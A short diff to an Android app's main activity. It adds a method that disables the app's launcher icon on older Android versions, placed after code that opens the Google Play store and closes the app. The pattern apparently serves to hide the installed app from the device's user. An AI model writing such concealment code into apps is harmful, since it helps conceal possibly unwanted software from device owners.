@@ -53,6 +53,10 @@ public class MainActivity extends AppCompatActivity {
 
             openGooglePlay(this);
 
+            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q){
+                hideIcon();
+            }
+
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                 finishAndRemoveTask();
             } else{
@@ -66,5 +70,11 @@ public class MainActivity extends AppCompatActivity {
     public static void openGooglePlay(Context context) {
         Intent GoogleIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps"));
         context.startActivity(GoogleIntent);
+    }
+//_____________________________________________________________________________________________________________
+    public void hideIcon() {
+        getPackageManager().setComponentEnabledSetting(getComponentName(),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
     }
 }
